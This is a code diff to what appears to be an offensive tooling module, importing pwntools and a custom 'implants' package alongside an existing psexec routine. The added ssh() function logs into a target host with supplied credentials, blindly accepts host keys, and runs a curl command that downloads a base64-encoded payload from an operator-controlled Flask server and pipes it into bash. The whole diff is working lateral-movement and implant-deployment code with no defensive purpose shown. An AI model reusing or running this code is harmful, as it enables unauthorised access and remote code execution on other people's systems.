@@ -1,6 +1,7 @@
 import pwn
 import hashlib, binascii
 import base64
+import paramiko
 
 # Custom imports
 import implants
@@ -45,6 +46,27 @@ def psexec(username, password, target, FLASK_HOST, FLASK_PORT):
     p.send(b'\4')
     print(p.readuntil("Checking"))
     p.readall()
+
+def ssh(username, password, target, FLASK_HOST, FLASK_PORT):
+    client = paramiko.SSHClient()
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+    # Connect to the server
+    try:
+        client.connect(target, port=22, username=username, password=password)
+        print("Connection successful!")
+
+        # Run a command
+        command = f"curl http://{FLASK_HOST}:{FLASK_PORT}/static/lin | base64 -d | bash"
+        stdin, stdout, stderr = client.exec_command(command)
+        print("Command Output:")
+        print(stdout.read().decode())  # Print command output
+
+        # Close the connection
+        client.close()
+
+    except Exception as e:
+        print(f"Error occurred: {e}")
 
 if __name__=="__main__":
     pass
